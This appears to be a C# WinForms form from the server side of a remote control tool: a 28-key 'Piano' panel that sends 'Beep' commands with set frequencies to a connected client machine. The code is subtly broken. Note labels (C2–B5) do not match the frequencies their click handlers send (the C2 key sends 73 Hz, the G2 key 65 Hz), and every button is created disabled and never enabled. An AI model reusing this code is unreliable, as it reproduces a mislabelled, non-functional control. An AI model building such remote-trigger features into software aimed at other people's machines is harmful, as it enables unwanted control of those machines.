using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormPiano : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Panel panel1;

	private Timer timer1;

	public RJButton rjButton1;

	public RJButton rjButton2;

	public RJButton rjButton3;

	public RJButton rjButton4;

	public RJButton rjButton5;

	public RJButton rjButton6;

	public RJButton rjButton7;

	public RJButton rjButton8;

	public RJButton rjButton9;

	public RJButton rjButton10;

	public RJButton rjButton11;

	public RJButton rjButton12;

	public RJButton rjButton13;

	public RJButton rjButton14;

	public RJButton rjButton15;

	public RJButton rjButton16;

	public RJButton rjButton17;

	public RJButton rjButton18;

	public RJButton rjButton19;

	public RJButton rjButton20;

	public RJButton rjButton21;

	public RJButton rjButton22;

	public RJButton rjButton23;

	public RJButton rjButton24;

	public RJButton rjButton25;

	public RJButton rjButton26;

	public RJButton rjButton27;

	public RJButton rjButton28;

	private Color PrimaryTheme
	{
		get
		{
			if (MaterialSkinManager.Instance.Theme != MaterialSkinManager.Themes.DARK)
			{
				return MaterialSkinManager.Instance.ColorScheme.LightPrimaryColor;
			}
			return MaterialSkinManager.Instance.ColorScheme.DarkPrimaryColor;
		}
	}

	private new Color PrimaryColor => MaterialSkinManager.Instance.ColorScheme.PrimaryColor;

	public FormPiano()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void FormPiano_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ColorSchemeChanged += ChangeScheme;
		MaterialSkinManager.Instance.ThemeChanged += ChangeTheme;
		ChangeScheme(this);
		ChangeTheme(this);
		timer1.Start();
	}

	private void ChangeTheme(object sender)
	{
		Color backColor = (BackColor = ((MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK) ? Color.FromArgb(40, 40, 40) : Color.White));
		panel1.BackColor = backColor;
	}

	private void ChangeScheme(object sender)
	{
		rjButton1.BackColor = PrimaryColor;
		rjButton2.BackColor = PrimaryColor;
		rjButton3.BackColor = PrimaryColor;
		rjButton4.BackColor = PrimaryColor;
		rjButton5.BackColor = PrimaryColor;
		rjButton6.BackColor = PrimaryColor;
		rjButton7.BackColor = PrimaryColor;
		rjButton8.BackColor = PrimaryColor;
		rjButton9.BackColor = PrimaryColor;
		rjButton10.BackColor = PrimaryColor;
		rjButton11.BackColor = PrimaryColor;
		rjButton12.BackColor = PrimaryColor;
		rjButton13.BackColor = PrimaryColor;
		rjButton14.BackColor = PrimaryColor;
		rjButton15.BackColor = PrimaryColor;
		rjButton16.BackColor = PrimaryColor;
		rjButton17.BackColor = PrimaryColor;
		rjButton18.BackColor = PrimaryColor;
		rjButton19.BackColor = PrimaryColor;
		rjButton20.BackColor = PrimaryColor;
		rjButton21.BackColor = PrimaryColor;
		rjButton22.BackColor = PrimaryColor;
		rjButton23.BackColor = PrimaryColor;
		rjButton24.BackColor = PrimaryColor;
		rjButton25.BackColor = PrimaryColor;
		rjButton26.BackColor = PrimaryColor;
		rjButton27.BackColor = PrimaryColor;
		rjButton28.BackColor = PrimaryColor;
	}

	private void rjButton5_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 65 }));
		}
	}

	private void rjButton1_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 73 }));
		}
	}

	private void rjButton2_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 82 }));
		}
	}

	private void rjButton3_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 87 }));
		}
	}

	private void rjButton4_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 98 }));
		}
	}

	private void rjButton7_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 123 }));
		}
	}

	private void rjButton6_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 110 }));
		}
	}

	private void rjButton14_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 131 }));
		}
	}

	private void rjButton13_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 147 }));
		}
	}

	private void rjButton12_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 165 }));
		}
	}

	private void rjButton11_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 175 }));
		}
	}

	private void rjButton10_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 196 }));
		}
	}

	private void rjButton9_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 220 }));
		}
	}

	private void rjButton8_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 247 }));
		}
	}

	private void rjButton28_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 262 }));
		}
	}

	private void rjButton27_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 294 }));
		}
	}

	private void rjButton26_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 330 }));
		}
	}

	private void rjButton25_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 349 }));
		}
	}

	private void rjButton24_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 392 }));
		}
	}

	private void rjButton23_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 440 }));
		}
	}

	private void rjButton22_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 494 }));
		}
	}

	private void rjButton21_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 523 }));
		}
	}

	private void rjButton20_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 587 }));
		}
	}

	private void rjButton19_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 658 }));
		}
	}

	private void rjButton18_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 698 }));
		}
	}

	private void rjButton17_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 784 }));
		}
	}

	private void rjButton16_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 880 }));
		}
	}

	private void rjButton15_Click(object sender, EventArgs e)
	{
		if (client != null && client.itsConnect)
		{
			client.Send(LEB128.Write(new object[2] { "Beep", 988 }));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.panel1 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjButton3 = new CustomControls.RJControls.RJButton();
		this.rjButton4 = new CustomControls.RJControls.RJButton();
		this.rjButton5 = new CustomControls.RJControls.RJButton();
		this.rjButton6 = new CustomControls.RJControls.RJButton();
		this.rjButton7 = new CustomControls.RJControls.RJButton();
		this.rjButton8 = new CustomControls.RJControls.RJButton();
		this.rjButton9 = new CustomControls.RJControls.RJButton();
		this.rjButton10 = new CustomControls.RJControls.RJButton();
		this.rjButton11 = new CustomControls.RJControls.RJButton();
		this.rjButton12 = new CustomControls.RJControls.RJButton();
		this.rjButton13 = new CustomControls.RJControls.RJButton();
		this.rjButton14 = new CustomControls.RJControls.RJButton();
		this.rjButton15 = new CustomControls.RJControls.RJButton();
		this.rjButton16 = new CustomControls.RJControls.RJButton();
		this.rjButton17 = new CustomControls.RJControls.RJButton();
		this.rjButton18 = new CustomControls.RJControls.RJButton();
		this.rjButton19 = new CustomControls.RJControls.RJButton();
		this.rjButton20 = new CustomControls.RJControls.RJButton();
		this.rjButton21 = new CustomControls.RJControls.RJButton();
		this.rjButton22 = new CustomControls.RJControls.RJButton();
		this.rjButton23 = new CustomControls.RJControls.RJButton();
		this.rjButton24 = new CustomControls.RJControls.RJButton();
		this.rjButton25 = new CustomControls.RJControls.RJButton();
		this.rjButton26 = new CustomControls.RJControls.RJButton();
		this.rjButton27 = new CustomControls.RJControls.RJButton();
		this.rjButton28 = new CustomControls.RJControls.RJButton();
		this.BackColor = System.Drawing.Color.White;
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.panel1.Name = "panel1";
		this.panel1.TabIndex = 0;
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		int x = 10;
		int y = 10;
		int w = 40;
		int h = 120;
		int step = 42;
		CustomControls.RJControls.RJButton[] buttons = new CustomControls.RJControls.RJButton[28]
		{
			this.rjButton1, this.rjButton2, this.rjButton3, this.rjButton4, this.rjButton5, this.rjButton6, this.rjButton7, this.rjButton8, this.rjButton9, this.rjButton10,
			this.rjButton11, this.rjButton12, this.rjButton13, this.rjButton14, this.rjButton15, this.rjButton16, this.rjButton17, this.rjButton18, this.rjButton19, this.rjButton20,
			this.rjButton21, this.rjButton22, this.rjButton23, this.rjButton24, this.rjButton25, this.rjButton26, this.rjButton27, this.rjButton28
		};
		System.EventHandler[] handlers = new System.EventHandler[28]
		{
			new System.EventHandler(rjButton1_Click),
			new System.EventHandler(rjButton2_Click),
			new System.EventHandler(rjButton3_Click),
			new System.EventHandler(rjButton4_Click),
			new System.EventHandler(rjButton5_Click),
			new System.EventHandler(rjButton6_Click),
			new System.EventHandler(rjButton7_Click),
			new System.EventHandler(rjButton8_Click),
			new System.EventHandler(rjButton9_Click),
			new System.EventHandler(rjButton10_Click),
			new System.EventHandler(rjButton11_Click),
			new System.EventHandler(rjButton12_Click),
			new System.EventHandler(rjButton13_Click),
			new System.EventHandler(rjButton14_Click),
			new System.EventHandler(rjButton15_Click),
			new System.EventHandler(rjButton16_Click),
			new System.EventHandler(rjButton17_Click),
			new System.EventHandler(rjButton18_Click),
			new System.EventHandler(rjButton19_Click),
			new System.EventHandler(rjButton20_Click),
			new System.EventHandler(rjButton21_Click),
			new System.EventHandler(rjButton22_Click),
			new System.EventHandler(rjButton23_Click),
			new System.EventHandler(rjButton24_Click),
			new System.EventHandler(rjButton25_Click),
			new System.EventHandler(rjButton26_Click),
			new System.EventHandler(rjButton27_Click),
			new System.EventHandler(rjButton28_Click)
		};
		string[] labels = new string[28]
		{
			"C2", "D2", "E2", "F2", "G2", "A2", "B2", "C3", "D3", "E3",
			"F3", "G3", "A3", "B3", "C4", "D4", "E4", "F4", "G4", "A4",
			"B4", "C5", "D5", "E5", "F5", "G5", "A5", "B5"
		};
		for (int i = 0; i < buttons.Length; i++)
		{
			CustomControls.RJControls.RJButton b = buttons[i];
			b.Name = "rjButton" + (i + 1);
			b.Size = new System.Drawing.Size(w, h);
			b.Location = new System.Drawing.Point(x + step * i, y);
			b.Text = labels[i];
			b.TabIndex = i + 1;
			b.Enabled = false;
			b.Click += handlers[i];
			this.panel1.Controls.Add(b);
		}
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(step * buttons.Length + 24, 206);
		base.Controls.Add(this.panel1);
		base.Name = "FormPiano";
		this.Text = "Piano";
		base.Load += new System.EventHandler(FormPiano_Load);
	}
}
